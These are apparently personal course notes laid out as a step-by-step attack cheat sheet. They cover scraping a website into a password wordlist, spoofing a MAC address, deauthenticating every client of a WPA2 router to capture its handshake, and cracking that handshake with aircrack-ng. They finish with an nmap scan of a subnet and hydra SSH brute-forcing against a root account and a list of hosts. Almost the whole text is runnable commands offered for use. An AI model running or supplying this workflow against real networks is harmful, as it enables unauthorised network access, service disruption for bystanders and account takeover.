## Wordlist Crawler 

- sudo apt install cewl

- `cewl -d 1 -m 8 -w wordlist-d1m8-samecase.txt https://avengers.marvelhq.com/`
- `cewl -d 1 -m 8 -w wordlist-d1m8-lowercase.txt https://avengers.marvelhq.com/ --lowercase` 
- `cewl -d 2 -m 8 -w wordlist-d2m8-lowercase.txt https://avengers.marvelhq.com/ --lowercase` 
- `cewl -d 1 -m 1 -w wordlist-d1m1-lowercase.txt https://avengers.marvelhq.com/ --lowercase` 
- `cewl -d 1 -m 1 -w wordlist-d1m1-samecase.txt https://avengers.marvelhq.com/`
- `cewl -d 2 -m 1 -w wordlistd2m1-d2m1-lowercase.txt https://avengers.marvelhq.com/ --lowercase`

```sh
curl "https://avengers.marvelhq.com/" | sed 's/[^a-zA-Z ]/ /g' | tr 'A-Z ' 'a-z\n' | grep '[a-z]' | sort -u > wordlist.txt
``` 

## WPA2 Brute Force 

- The shortest password allowed with WPA2 is 8 characters long
- sudo su 
- echo <password> | sudo -S <command>

### Start and Check Wifi Adapter Monitor Mode

- iwconfig

- airmon-ng check kill
- airmon-ng
- airmon-ng start wlan0

### Attack 1 (Moodle)

1. airmon-ng

2. macchanger --mac 00:11:22:33:44:55 wlan0

3. macchanger -s wlan0  (60:a4:b7:22:74:9f)

4. airmon-ng start wlan0

5. airodump-ng wlan0

to retrieve bssid mac and chanel

6. airodump-ng -c 1 -w file --bssid 48:29:52:46:92:CB wlan0

7. aireplay-ng --deauth 1 -a 48:29:52:46:92:CB -c 60:a4:b7:22:74:9f wlan0

8. aircrack-ng -w wordlist.txt file-01.cap


### Discover information about router

To retrieve MAC ADDRESS, CHANNEL and ESSID use:

- sudo airodump-ng wlan0
    - MA => 48:29:52:46:92:CB
    - CH => 1
    - ESSID => Casa_wifi

### Attack 2

1. To check station connected to the router:

- sudo airodump-ng -c 1 wlan0 -d 48:29:52:46:92:CB 
    -  Specify the channel to use aireplay correctly

2. Run this analyzes packets before deauth everyone to writes handshake to a file:

- sudo airodump-ng -w hacktest -c 1 --bssid 48:29:52:46:92:CB wlan0

3. To forces deauth everyone:

- sudo aireplay-ng --deauth 0 -a 48:29:52:46:92:CB wlan0

4. Uses the hack01-01.cap to analyze in wireshark: search for ***eapol** which is the handshake protocol used to auth

5. Check for the second message of the handshake in:
    - 802.1X authentication
    - WPA KEY DATA: 30140100000fac040100000fac040100000fac020c00
    - the handshake packets is needed to step 6 can try a bunch of random passwords...

- :warning: we can skip the step 4 e 5 above and just try the step 6 and with lucky it works :warning: 

6. sudo aircrack-ng hack-01.cap -w wordlist.txt
    - and the outputs should appear !!!
    - sudo aircrack-ng hack01-01.cap -w /usr/share/wordlists/rockyou.txt

## SSH Brute Force
- sudo service NetworkManager restart
- iwconfig

- sudo airmon-ng stop wlan0
- ifconfig
- sudo nmap -sP 192.168.15.0/24
- sudo nmap -sP 192.168.15.0/24 -p 80,22

----- 
- sudo nmap 192.168.15.* -p ssh --open


- sudo nmap 192.168.15.* --open
-----

- ssh user@ipaddress

- hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.15.1 -t 4 ssh

- hydra -L /usr/share/wordlists.rockyou.txt -P /usr/share/wordlists/rockyou.txt -M Documents/ip.txt -t 4 ssh

-L list of users
-M list of ips